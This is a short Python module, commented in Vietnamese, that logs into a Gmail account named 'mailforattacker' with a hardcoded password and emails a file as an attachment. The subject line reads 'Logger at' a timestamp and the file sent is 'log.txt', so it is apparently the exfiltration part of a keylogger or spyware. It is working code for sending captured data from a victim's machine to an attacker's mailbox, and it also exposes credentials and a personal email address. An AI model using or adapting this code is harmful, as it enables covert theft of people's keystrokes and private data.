### Thư viện tự tạo để gửi mail

import smtplib
import ssl
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import time

def check():
    try:
        server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
        server.close()
        return True
    except:
        return False

def send(filename, gmail_receiver):
    gmail_user = 'mailforattacker@gmail.com'
    gmail_password = '4tt4ck3r'

    Message = MIMEMultipart()
    Message["From"] = gmail_user
    Message["To"] = gmail_receiver
    Message["Subject"] = "Logger at {}".format(time.asctime())

    with open(filename, "rb") as attachment:
        # Add file as application/octet-stream
        # Email client can usually download this automatically as attachment
        part = MIMEBase("application", "octet-stream")
        part.set_payload(attachment.read())

    # Encode file in ASCII characters to send by email    
    encoders.encode_base64(part)

    # Add header as key/value pair to attachment part
    part.add_header(
        "Content-Disposition",
        f"attachment; filename= {filename}",
    )

    Message.attach(part)
    text = Message.as_string()

    try:
        context = ssl.create_default_context()
        server = smtplib.SMTP_SSL('smtp.gmail.com', 465, context= context)
        server.ehlo()
        server.login(gmail_user, gmail_password)
        #server.starttls()
        server.sendmail(gmail_user, gmail_receiver, text)
        server.close()
        print("Send successfully at {}".format(time.asctime()))
    except Exception as e:
        print(e)    

if __name__ == "__main__":
    send("log.txt", "huykingsofm@gmail.com")